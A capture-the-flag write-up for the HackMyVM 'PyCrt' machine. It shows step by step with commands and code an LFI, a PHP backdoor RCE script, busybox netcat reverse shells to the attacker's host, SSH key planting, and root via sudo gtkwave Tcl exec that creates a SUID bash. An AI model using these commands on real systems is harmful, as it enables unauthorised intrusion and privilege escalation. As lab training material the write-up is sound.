# Writeup



## Recon

::: details nmap_scan.log
```log
Open 10.0.2.49:80
Open 10.0.2.49:22
Open 10.0.2.49:6667
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.49

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp   open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Debian Default Page: It works
6667/tcp open  irc     syn-ack
| irc-info: 
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   server: irc.local
|   version: InspIRCd-3. irc.local 
|   source ident: nmap
|   source host: 10.0.2.15
|_  error: Closing link: (nmap@10.0.2.15) [Client exited]
Service Info: Host: irc.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## IRC

```bash
└─$ irssi -c pycrt.hmv -n woyag
 Irssi v1.4.5 - https://irssi.org
10:19 -!- Irssi: Looking up irc.local
10:19 -!- Irssi: Connecting to irc.local [10.0.2.49] port 6667
10:19 Waiting for CAP LS response...
10:19 -!- Irssi: Connection to irc.local established
10:19 !irc.local *** Looking up your hostname...
10:19 !irc.local *** Could not resolve your hostname: Request timed out; using your IP address (10.0.2.15) instead.
10:19 -!- Welcome to the Localnet IRC Network woyag!woyag@10.0.2.15
10:19 -!- Your host is irc.local, running version InspIRCd-3
10:19 -!- This server was created 10:10:38 Sep 09 2025
10:19 -!- irc.local InspIRCd-3 iosw biklmnopstv bklov
10:19 -!- AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,imnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 are supported by this server
10:19 -!- MAXTARGETS=20 MODES=20 NAMELEN=128 NETWORK=Localnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 USERMODES=,,s,iow WHOX are supported by this server
10:19 -!- There are 0 users and 0 invisible on 1 servers
10:19 -!- 1 unknown connections
10:19 -!- 0 channels formed
10:19 -!- I have 0 clients and 0 servers
10:19 -!- Current local users: 0  Max: 1
10:19 -!- Current global users: 0  Max: 1
10:19 -!- irc.local message of the day
10:19 -!-  **************************************************
10:19 -!-  *             H    E    L    L    O              *
10:19 -!-  *  This is a private irc server. Please contact  *
10:19 -!-  *  the admin of the server for any questions or  *
10:19 -!-  *  issues ShadowSec directory.                   *
10:19 -!-  **************************************************
10:19 -!-  *  The software was provided as a package of     *
10:19 -!-  *  Debian GNU/Linux <https://www.debian.org/>.   *
10:19 -!-  *  However, Debian has no control over this      *
10:19 -!-  *  server.                                       *
10:19 -!-  **************************************************
10:19 -!-  (The sysadmin possibly wants to edit </etc/inspircd/inspircd.motd>)
10:19 -!- End of message of the day.
10:19 -!- Mode change [+i] for user woyag
```

I updated DNS records, but same results for `irc.local`

```bash
[(status)] /channel LIST
10:21 Channel         Network    Password   Settings
10:21 #lobby          EsperNet
10:21 #libera         liberachat
10:21 #irssi          liberachat
10:21 #gamesurge      GameSurge
10:21 #irssi          IRCnet
10:21 #ircsource      IRCSource
10:21 #netfuze        NetFuze
10:21 #oftc           OFTC
10:21 silc            SILC
[(status)] /join CHANNEL
```

All of the channels are pretty much empty

## HTTP

Default Apache2 page

![writeup.png](/assets/pentest/hackmyvm/pycrt/writeup.png)

Nothing from fuzzing
```bash
└─$ feroxbuster -u http://pycrt.hmv -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -W 28
200      GET      368l      933w    10701c http://pycrt.hmv/index.html
200      GET      368l      933w    10701c http://pycrt.hmv/
```

Coming from IRC channel we try to access `ShadowSec Directory` 

![writeup-1.png](/assets/pentest/hackmyvm/pycrt/writeup-1.png)

Finally something appeared
```bash
└─$ feroxbuster -u http://pycrt.hmv/ShadowSec -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -W 28
# Nothing

└─$ feroxbuster -u http://pycrt.hmv/ShadowSec -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -W 28
200      GET        1l        4w       21c http://pycrt.hmv/ShadowSec/bydataset.php
```

### LFI

`Nothing to see here.` in CTFs translates into **THERE IS SOMETHING HERE**.

```bash
└─$ curl http://pycrt.hmv/ShadowSec/bydataset.php -i
HTTP/1.1 200 OK
Date: Tue, 09 Sep 2025 14:51:05 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 21
Content-Type: text/html; charset=UTF-8

Nothing to see here.
```

```bash
└─$ ffuf -u 'http://pycrt.hmv/ShadowSec/bydataset.php?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 21
file                    [Status: 200, Size: 19, Words: 4, Lines: 1, Duration: 14ms]
```

```bash
└─$ curl 'http://pycrt.hmv/ShadowSec/bydataset.php' -s -G --data-urlencode 'file=/etc/passwd' | grep sh$
root:x:0:0:root:/root:/bin/bash
pycrtlake:x:1000:1000:pycrtlake,,,:/home/pycrtlake:/bin/bash
chatlake:x:1001:1001::/home/chatlake:/bin/sh
```

[https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#phpfilter](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#phpfilter)

```bash
└─$ curl 'http://pycrt.hmv/ShadowSec/bydataset.php' -s -G --data-urlencode 'file=php://filter/convert.base64-encode/resource=bydataset.php' | base64 -d
<?php

function decrypt($input) {
    $reversed = strrev($input);
    echo "Reversed: " . $reversed . "\n";

    $decoded = base64_decode($reversed);
    echo "Decoded: " . $decoded . "\n";

    if ($decoded === false) { echo "Base64 decoding failed.\n"; return false; }

    if (strpos($decoded, 'cmd:') === 0) { return substr($decoded, 4); }

    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (stripos($file, 'phpinfo') !== false) { exit('Access Denied'); }

    $filterUrl = 'php://filter/convert.base64-encode/resource=' . $file;
    $data = @file_get_contents($filterUrl);
    if ($data === false) { exit('Failed to read file'); }
    echo base64_decode($data);
    exit;
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth']) && isset($_POST['payload'])) {
    $auth = $_POST['auth'];
    $payload = $_POST['payload'];

    if ($auth !== 'LetMeIn123!') { exit('Invalid Auth Token.'); }

    $command = decrypt($payload);
    if ($command !== false) {
        $output = exec($command);
        echo "<pre>$output</pre>";
    } else {
        echo "Payload decode failed.\n";
    }
    exit;
} else {
    echo "Nothing to see here.";
}
?>
```

### RCE

```python
from base64 import b64encode
import sys
from requests import Session
from bs4 import BeautifulSoup as BS

URL = 'http://pycrt.hmv/ShadowSec/bydataset.php'

def encrypt(payload):
    return b64encode(payload.encode()).decode()[::-1]

def send(session, cmd):
    resp = session.post(URL, data={
        'auth': 'LetMeIn123!',
        'payload': encrypt('cmd:' + cmd)
    })
    return BS(resp.text, 'html.parser').find('pre').text

with Session() as session:
    if len(sys.argv) > 1:
        print(send(session, sys.argv[1]))
    else:
        while True:
            cmd = input('Command: ')
            output = send(session, cmd)
            print(output)
```

```bash
└─$ py rce.py id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
└─$ py rce.py 'nc 10.0.2.15 4444 -e /bin/bash'         # Didnt work
└─$ py rce.py 'busybox nc 10.0.2.15 4444 -e /bin/bash' # Worked
---
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.49] 48524
id # Command line
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -qc /bin/bash # Get TTY
www-data@PyCrt:/var/www/html/ShadowSec$ ^Z # Upgrade shell, step 1
zsh: suspended  nc -lvnp 4444

└─$ stty raw -echo;fg;                     # Upgrade shell, step 2
[1]  + continued  nc -lvnp 4444

www-data@PyCrt:/var/www/html/ShadowSec$ stty rows 47 cols 211;export TERM=xterm # Better terminal~
```

## Lateral Movement (chatlake)

```bash
www-data@PyCrt:/var$ sudo -l
Matching Defaults entries for www-data on PyCrt:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on PyCrt:
    (chatlake) NOPASSWD: /usr/bin/weechat
```

```bash
www-data@PyCrt:/var$ /usr/bin/weechat --help

WeeChat 3.0 Copyright (C) 2003-2020, compiled on Jan 23 2022 14:29:14
Developed by S?bastien Helleu <flashcode@flashtux.org> - https://weechat.org/

Usage: /usr/bin/weechat [option...] [plugin:option...]

  -a, --no-connect         disable auto-connect to servers at startup
  -c, --colors             display default colors in terminal
...
  -r, --run-command <cmd>  run command(s) after startup;
                           many commands can be separated by semicolons,
                           this option can be given multiple times
...
```

`-r` kept failing so I just connected without flags.
```bash
www-data@PyCrt:/var/www/html/ShadowSec$ sudo -u chatlake weechat
```

![writeup-2.png](/assets/pentest/hackmyvm/pycrt/writeup-2.png)

Do `/exec COMMAND` to execute commands.

```
/exec busybox nc 10.0.2.15 4444 -e /bin/bash
```

```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.49] 51012
id
uid=1001(chatlake) gid=1001(chatlake) groups=1001(chatlake)
script /dev/null -qc/bin/bash
chatlake@PyCrt:/var/www/html/ShadowSec$ ^Z
zsh: suspended  nc -lvnp 4444

└─$ stty raw -echo;fg;
[1]  + continued  nc -lvnp 4444

chatlake@PyCrt:/var/www/html/ShadowSec$ stty rows 47 cols 211;export TERM=xterm
```

## SSH

```bash
└─$ ssh-keygen -f id_rsa -q -P x
└─$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIptnHjqal3K1aZJxhGx5xpxSbknbCs3/ZLQMwPrX+Rk woyag@kraken
---
chatlake@PyCrt:~$ mkdir .ssh
chatlake@PyCrt:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIptnHjqal3K1aZJxhGx5xpxSbknbCs3/ZLQMwPrX+Rk woyag@kraken' > .ssh/authorized_keys
---
└─$ ssh -i id_rsa chatlake@pycrt.hmv
$ id
uid=1001(chatlake) gid=1001(chatlake) groups=1001(chatlake)
$ /bin/bash # sh sucks
```

### User.txt

```bash
chatlake@PyCrt:~$ cat user.txt
flag{b42baba466402e32157a1cbba819664e}
```

## Privilege Escalation

```bash
chatlake@PyCrt:~$ sudo -l
Matching Defaults entries for chatlake on PyCrt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User chatlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service

chatlake@PyCrt:~$ find /etc -name irc_bot.service -ls 2>/dev/null
  1701681      4 -rw-r--r--   1 root     root          323 Apr  4 10:24 /etc/systemd/system/irc_bot.service
chatlake@PyCrt:~$ cat /etc/systemd/system/irc_bot.service
[Unit]
Description=IRC Bot Service
After=network.target

[Service]
User=pycrtlake
Group=pycrtlake
WorkingDirectory=/usr/local/bin
ExecStart=/usr/bin/python3 /usr/local/bin/irc_bot.py
Restart=always
RestartSec=5
StandardOutput=syslog
StandardError=syslog
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target

chatlake@PyCrt:~$ ls -lh /usr/local/bin/irc_bot.py
-rwxr-x--- 1 pycrtlake pycrtlake 5.7K Apr  5 08:32 /usr/local/bin/irc_bot.py
chatlake@PyCrt:~$ cat /usr/local/bin/irc_bot.py
cat: /usr/local/bin/irc_bot.py: Permission denied
```

We can only start the bot, but we don't know what it does.

```bash
chatlake@PyCrt:~$ sudo /usr/bin/systemctl start irc_bot.service
```

[https://irssi.org/documentation/help/cat_IRC%20Commands/#](https://irssi.org/documentation/help/cat_IRC%20Commands/#)

```bash
[(status)] /lusers
11:34 -!- There are 1 users and 1 invisible on 1 servers
11:34 -!- 6 channels formed
11:34 -!- I have 2 clients and 0 servers
11:34 -!- Current local users: 2  Max: 2
11:34 -!- Current global users: 2  Max: 2
 [11:34] [woyag(+i)] [1:rc (change with ^X)]

[(status)] /list
11:36 -!- Channel Users Name
11:36 -!- #chan2 1 [+nt]
11:36 -!- #chan3 1 [+nt]
11:36 -!- #chan4 1 [+nt]
11:36 -!- #chan5 1 [+nt]
11:36 -!- #chan6 1 [+nt]
11:36 -!- #chan1 1 [+nt]
11:36 -!- End of channel list.

[(status)] /join chan1
...
11:38 [Users #chan1]
11:38 [@admin] [ woyag]
...
[(status)] /leave
[(status)] /who admin
11:38 -!-     #chan6 admin     H@  0  admin@127.0.0.1 [admin]

[(status)] /join chan6
```

After lots of silence `admin` writes something
```bash
11:40 <@admin> My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End
```

::: info Note
Not sure if sending normal messages in channel is required, but after some time admin "responded"
:::

If you join `chanX` and then end your messages with `:)` in `admin`'s DMs you get verbose error messages. 

```
# To join channel
/join chan1
# To DM admin
/query admin
# To split windows
/window new split
```

![writeup-3.png](/assets/pentest/hackmyvm/pycrt/writeup-3.png)

Somehow only numbers are allowed, but it says **Command Execution Not Allowed**

Bot mentioned talking with friends and that should mean we can impersonate someone. Tried local usernames, but nope.

Going back to HTTP it mentioned **Operative**, could be possible username.
```bash
└─$ curl 'http://pycrt.hmv/ShadowSec/' -s | html2markdown
# SHADOWSEC Tactical Interface

Core Command

Armory Database

Tactical Simulation

Shadow Comms

Quantum Protocol

▶ OPERATIVE: ll104567 (CODEX: BATTLE GOD) ◀ COMBAT SUCCESS RATE: 98.7% ▶
SHADOW SYNC: 100% ◀ LAST ACTIVE: 2025-04-04 21:37:05

## OPERATION ARCHIVE - Army of Shadows

  * Phantom Strike Response: 0.08s
  * Tactical Prediction Accuracy: 99.3%
  * Shadow Assault Success: 100%

▶ QUANTUM ENCRYPTION ACTIVE ◀ TACTICAL MODULES LOADED ◀ SHADOW NETWORK STABLE
◀ GLORY FIELD DEPLOYED
```

```bash
└─$ irssi -c irc.local -n ll104567

12:10 < ll104567> 100:)
12:10 <admin> [!] Wrong command: 'd' unauthorized!
```

It's talking in ASCII codes
```bash
└─$ py -c 'print(chr(100))'
d
```

Use **CyberChef** to translate ASCII to digits.

![writeup-4.png](/assets/pentest/hackmyvm/pycrt/writeup-4.png)

```bash
12:14 < ll104567> 119 104 111 97 109 105:)
12:14 <admin> [+] COMMAND EXECUTION：pycrtlake

12:11 < ll104567> 105 100:)
12:14 <admin> [!] Wrong command: 'id' unauthorized!

12:14 < ll104567> 98 117 115 121 98 111 120:)
12:14 <admin> [+] COMMAND EXECUTION：BusyBox v1.30.1 (Debian 1:1.30.1-4) multi-call binary. ...
```

### Reverse Shell

```bash
12:19 < ll104567> 98 117 115 121 98 111 120 32 110 99 32 49 48 46 48 46 50 46 49 53 32 52 52 52 52 32 45 101 32 47 98 105 110 47 98 97 115 104:)
---
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.49] 50370
script /dev/null -qc/bin/bash
pycrtlake@PyCrt:/usr/local/bin$ id
uid=1000(pycrtlake) gid=1000(pycrtlake) groups=1000(pycrtlake),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

```python
pycrtlake@PyCrt:/usr/local/bin$ cat irc_bot.py
import irc.bot
import irc.client
import re
import subprocess
import time
import threading

class IRCBot(irc.bot.SingleServerIRCBot):
    def __init__(self, server, port, nickname, channels, command_channel):
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel_list = channels
        self.command_channel = "#chan1"  # 唯一执行命令的频道
        self.command_channels = ["#chan1", "#chan2", "#chan3", "#chan4", "#chan5"]  # 所有检测命令的频道
        self.command_pattern = re.compile(r':\)$')
        self.allowed_users = {"Todd", "suraxddq", "ll104567"}
        self.number_regex = re.compile(r'^\s*(\d+\s+)*\d+\s*$')
        self.allowed_commands = ["more", "dir", "busybox", "whoami"]
        self.chan6_timer = None

    def on_welcome(self, connection, event):
        for channel in self.channel_list:
            connection.join(channel)
            print(f"[+] Already joined the channel：{channel}")
        self.start_chan6_timer()

    def start_chan6_timer(self):
        if self.chan6_timer:
            self.chan6_timer.cancel()
        self.chan6_timer = threading.Timer(180.0, self.send_chan6_message)
        self.chan6_timer.start()

    def send_chan6_message(self):
        try:
            if self.connection.is_connected():
                self.connection.privmsg("#chan6", "My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End")
                print("[*] Timed reminder has been sent #chan6")
        except Exception as e:
            print(f"[!] Sending timed notification failed：{str(e)}")
        finally:
            self.start_chan6_timer()

    def on_disconnect(self, connection, event):
        if self.chan6_timer:
            self.chan6_timer.cancel()
            self.chan6_timer = None
        super().on_disconnect(connection, event)

    def on_pubmsg(self, connection, event):
        channel = event.target
        user = event.source.nick
        message = event.arguments[0]

        # 检测所有命令频道的消息
        if channel in self.command_channels and self.command_pattern.search(message):
            print(f"[*] Received command：{message} (From users：{user})")

            # 格式验证（所有频道通用）
            cmd_part = message.rsplit(':)', 1)[0].strip()
            if not self.number_regex.match(cmd_part):
                connection.privmsg(user, "[!] Format error or presence of illegal characters")
                return

            # 非#chan1频道直接返回权限错误
            if channel != self.command_channel:
                connection.privmsg(user, "[!] Error: Command execution not allowed")
                return

            # #chan1专属执行流程
            if self.validate_command(user):
                try:
                    numbers = list(map(int, cmd_part.split()))
                    for num in numbers:
                        if num < 0 or num > 255:
                            raise ValueError("[-] Number range exceeds（0-255）")
                    ascii_cmd = ''.join([chr(n) for n in numbers])
                except ValueError as e:
                    connection.privmsg(user, f"[!] conversion error ：{str(e)}")
                    return

                if not self.is_command_allowed(ascii_cmd):
                    connection.privmsg(user, f"[!] Wrong command: '{ascii_cmd.split()[0]}' unauthorized!")
                    return

                result = self.execute_command(ascii_cmd)
                if result:
                    safe_result = result.replace('\n', ' ').replace('\r', '')
                    try:
                        connection.privmsg(user, f"[+] COMMAND EXECUTION：{safe_result}")
                    except irc.client.InvalidCharacters:
                        connection.privmsg(user, "[!] Format error or presence of illegal characters")
            else:
                connection.privmsg(user, "[!] Format error or presence of illegal characters")

    def is_command_allowed(self, command):
        parts = command.strip().split()
        if not parts:
            return False
        main_cmd = parts[0]
        return (
            main_cmd in self.allowed_commands and
            not re.search(r'[;&|`]', command)
        )

    def execute_command(self, command):
        try:
            parts = command.strip().split()
            output = subprocess.check_output(
                parts,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                timeout=10
            )
            return output.strip()[:400].replace('\r', '').replace('\n', ' ')
        except subprocess.CalledProcessError as e:
            return f"[!] Command execution failed：{e.output.strip()}"
        except Exception as e:
            return f"[-] Error：{str(e)}"

    def validate_command(self, user):
        return user in self.allowed_users

def run_bot():
    server = "PyCrt"
    port = 6667
    nickname = "admin"
    channels = ["#chan1", "#chan2", "#chan3", "#chan4", "#chan5", "#chan6"]
    command_channel = "#chan1"

    while True:
        try:
            print("[*] Starting IRC server...")
            bot = IRCBot(server, port, nickname, channels, command_channel)
            bot.start()
        except KeyboardInterrupt:
            print("\n[!] user exit")
            if bot.chan6_timer:
                bot.chan6_timer.cancel()
            break
        except Exception as e:
            print(f"[!] Exception occurred:{str(e)}，Try again in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    run_bot()
```

Upgrade to SSH
```bash
pycrtlake@PyCrt:~$ mkdir ~/.ssh
pycrtlake@PyCrt:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIptnHjqal3K1aZJxhGx5xpxSbknbCs3/ZLQMwPrX+Rk woyag@kraken' > ~/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa pycrtlake@pycrt.hmv
pycrtlake@PyCrt:~$ id
uid=1000(pycrtlake) gid=1000(pycrtlake) groups=1000(pycrtlake),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

## Privilege Escalation

```bash
pycrtlake@PyCrt:~$ sudo -l
Matching Defaults entries for pycrtlake on PyCrt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pycrtlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/gtkwave
```

It was mostly failing, but at least starting. 
```bash
pycrtlake@PyCrt:~$ sudo gtkwave -f /tmp/test
Could not initialize GTK!  Is DISPLAY env var/xhost set?
```

It can execute scripts
```bash
  -S, --script=FILE          specify Tcl command script file for execution
  -T, --tcl_init=FILE        specify Tcl command script file to be loaded on startup
  -W, --wish                 enable Tcl command line on stdio
```

- [https://gtkwave.github.io/gtkwave/tcl/commands.html](https://gtkwave.github.io/gtkwave/tcl/commands.html)
- [https://www.tcl-lang.org/man/tcl8.5/TclCmd/contents.htm](https://www.tcl-lang.org/man/tcl8.5/TclCmd/contents.htm)
	- [https://www.tcl-lang.org/man/tcl8.5/TclCmd/exec.htm](https://www.tcl-lang.org/man/tcl8.5/TclCmd/exec.htm): exec - Invoke subprocesses

Turns out GUI part is 100% necessary
```bash
pycrtlake@PyCrt:~$ echo 'exec install -m4777 /bin/bash /tmp/rootbash' > /tmp/letmein.tcl
pycrtlake@PyCrt:~$ sudo gtkwave -S /tmp/letmein.tcl
Could not initialize GTK!  Is DISPLAY env var/xhost set?
```

You can execute scripts via `-S` or just pop interactive CLI and essentially it's a root shell.
```bash
pycrtlake@PyCrt:~$ xvfb-run -a sudo gtkwave -W
...
% id
uid=0(root) gid=0(root) groups=0(root)
% install /bin/bash /tmp/rootbash -m4777

pycrtlake@PyCrt:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(pycrtlake) gid=1000(pycrtlake) euid=0(root) groups=1000(pycrtlake),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

> `xvfb-run` runs GTKWave in a virtual X framebuffer, no physical display needed; AKA dummy display.

### Root.txt

```bash
rootbash-5.0# cat /root/root.txt
flag{e80ecc46ca5e00bf8a51c47f0cc3e868}
```